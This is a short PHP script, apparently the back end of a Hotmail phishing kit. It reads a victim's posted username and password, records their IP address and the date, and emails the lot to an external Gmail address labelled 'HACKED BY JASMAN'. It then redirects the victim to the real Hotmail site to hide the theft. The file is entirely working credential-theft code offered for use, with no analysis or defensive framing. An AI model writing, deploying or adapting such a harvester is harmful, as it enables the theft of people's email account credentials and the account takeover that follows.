<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "--------      UserID      ------------------------------\n";
$message .= "Username: ".$_POST['Username']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "------------HACKED BY JASMAN---------------\n";

$recipient = "alertboxbyjasmankush@gmail.com";
$subject = "Hotmail HelpMeLord ";
$headers = "From: JASMAN";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.hotmail.com");

	   }


?>